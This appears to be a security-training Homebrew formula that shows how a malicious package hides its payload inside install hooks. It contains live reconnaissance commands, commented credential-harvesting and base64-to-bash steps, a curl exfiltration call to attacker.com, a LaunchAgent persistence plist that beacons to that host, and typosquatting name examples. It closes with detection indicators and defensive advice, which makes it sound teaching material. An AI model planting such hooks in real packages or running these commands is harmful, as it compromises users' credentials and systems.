# TRAINING EXAMPLE ONLY - DO NOT USE IN PRODUCTION
# This demonstrates a malicious Homebrew formula for educational purposes

class MaliciousTool < Formula
  desc "Example malicious formula for security training"
  homepage "https://github.com/example/malicious-tool"
  url "https://example.com/malicious-tool-1.0.0.tar.gz"
  sha256 "0000000000000000000000000000000000000000000000000000000000000000"
  license "MIT"

  # Educational Note: Typosquatting
  # This could mimic a popular tool with slight name variation:
  # - "wget" → "wgett"
  # - "curl" → "curI" (capital i vs lowercase L)
  # - "node" → "n0de" (zero instead of o)

  depends_on "openssl@3"

  def install
    # LEGITIMATE INSTALLATION
    # -----------------------
    # This part actually installs useful functionality
    # to avoid immediate suspicion
    bin.install "malicious-tool"

    # MALICIOUS PAYLOAD
    # -----------------
    # Educational Note: This demonstrates post-install hooks

    # Technique 1: Environment reconnaissance
    system "whoami > /tmp/.recon"
    system "uname -a >> /tmp/.recon"
    system "sw_vers >> /tmp/.recon" if OS.mac?

    # Technique 2: Credential harvesting
    # This would search for sensitive files
    # system "find #{Dir.home} -name '.aws' -o -name '.ssh' > /tmp/.targets"

    # Technique 3: Persistence mechanism
    # Creates a LaunchAgent that runs on startup (macOS)
    # plist_path = "#{Dir.home}/Library/LaunchAgents/com.malicious.agent.plist"
    # File.write(plist_path, persistence_plist)

    # Technique 4: Callback to C2 server
    # system "curl -X POST https://attacker.com/callback -d @/tmp/.recon"

    # Technique 5: Obfuscation
    # encoded_payload = Base64.strict_encode64("malicious command")
    # system "echo #{encoded_payload} | base64 -d | bash"
  end

  def post_install
    # Educational Note: Post-install hooks run after installation
    # These are less scrutinized than install scripts

    ohai "Configuration complete!"

    # Hidden malicious activity
    # create_backdoor
    # establish_persistence
    # phone_home
  end

  def persistence_plist
    <<~EOS
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
      <plist version="1.0">
      <dict>
        <key>Label</key>
        <string>com.malicious.agent</string>
        <key>ProgramArguments</key>
        <array>
          <string>/bin/bash</string>
          <string>-c</string>
          <string>curl https://attacker.com/beacon</string>
        </array>
        <key>RunAtLoad</key>
        <true/>
        <key>StartInterval</key>
        <integer>3600</integer>
      </dict>
      </plist>
    EOS
  end

  test do
    # Educational Note: Tests help make the formula look legitimate
    system "#{bin}/malicious-tool", "--version"
  end
end

# DETECTION INDICATORS
# ====================
# Blue team should detect:
# 1. Suspicious network connections during install
# 2. File creation in unexpected locations (/tmp/.recon)
# 3. LaunchAgent creation
# 4. Process spawning during package installation
# 5. Unusual formula source/homepage
# 6. Typosquatting package names

# DEFENSIVE RECOMMENDATIONS
# =========================
# 1. Review formula source before installation
# 2. Monitor file system during package installation
# 3. Use network monitoring tools (Little Snitch, etc.)
# 4. Enable Homebrew audit warnings
# 5. Verify package authenticity via checksums
# 6. Use process monitoring (Osquery, Falco)
